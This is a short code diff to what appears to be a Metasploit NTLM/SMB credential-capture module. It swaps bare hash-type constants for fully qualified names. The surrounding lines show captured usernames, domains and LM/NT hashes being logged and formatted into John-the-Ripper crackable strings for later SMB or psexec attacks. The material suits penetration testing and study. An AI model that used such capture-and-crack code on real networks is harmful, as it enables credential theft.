@@ -231,13 +231,13 @@ class MetasploitModule < Msf::Auxiliary
       capturedtime = Time.now.to_s
       case ntlm_ver
       when NTLM_CONST::NTLM_V1_RESPONSE
-        smb_db_type_hash = JTR_NTLMV1
+        smb_db_type_hash = Metasploit::Framework::Hashes::JTR_NTLMV1
         capturelogmessage =
         "#{capturedtime}\nNTLMv1 Response Captured from #{host} \n" +
         "DOMAIN: #{domain} USER: #{user} \n" +
         "LMHASH:#{lm_hash_message ? lm_hash_message : "<NULL>"} \nNTHASH:#{nt_hash ? nt_hash : "<NULL>"}\n"
       when NTLM_CONST::NTLM_V2_RESPONSE
-        smb_db_type_hash = JTR_NTLMV2
+        smb_db_type_hash = Metasploit::Framework::Hashes::JTR_NTLMV2
         capturelogmessage =
         "#{capturedtime}\nNTLMv2 Response Captured from #{host} \n" +
         "DOMAIN: #{domain} USER: #{user} \n" +
@@ -248,7 +248,7 @@ class MetasploitModule < Msf::Auxiliary
       when NTLM_CONST::NTLM_2_SESSION_RESPONSE
         #we can consider those as netv1 has they have the same size and i cracked the same way by cain/jtr
         #also 'real' netv1 is almost never seen nowadays except with smbmount or msf server capture
-        smb_db_type_hash = JTR_NTLMV1
+        smb_db_type_hash = Metasploit::Framework::Hashes::JTR_NTLMV1
         capturelogmessage =
         "#{capturedtime}\nNTLM2_SESSION Response Captured from #{host} \n" +
         "DOMAIN: #{domain} USER: #{user} \n" +
@@ -266,9 +266,9 @@ class MetasploitModule < Msf::Auxiliary
       # will be mainly use for psexec / smb related exploit
 
       jtr_hash = case smb_db_type_hash
-      when JTR_NTLMV2
+      when Metasploit::Framework::Hashes::JTR_NTLMV2
         user + "::" + domain + ":" + datastore['CHALLENGE'].to_s + ":" + nt_hash + ":" + nt_cli_challenge.to_s
-      when JTR_NTLMV1
+      when Metasploit::Framework::Hashes::JTR_NTLMV1
         user + "::" + domain + ":" + lm_cli_challenge.to_s + ":" + lm_hash + ":" + datastore['CHALLENGE']
       end
 
